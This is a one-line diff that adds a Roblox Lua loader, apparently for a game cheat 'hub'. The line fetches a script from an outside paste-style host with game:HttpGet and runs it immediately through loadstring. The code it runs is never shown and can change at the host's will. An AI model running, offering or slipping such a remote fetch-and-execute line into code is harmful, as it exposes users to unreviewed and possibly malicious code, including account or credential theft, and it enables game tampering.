@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://isnahamzahpastebin.tech/v1/gantenghubv1_026"))()
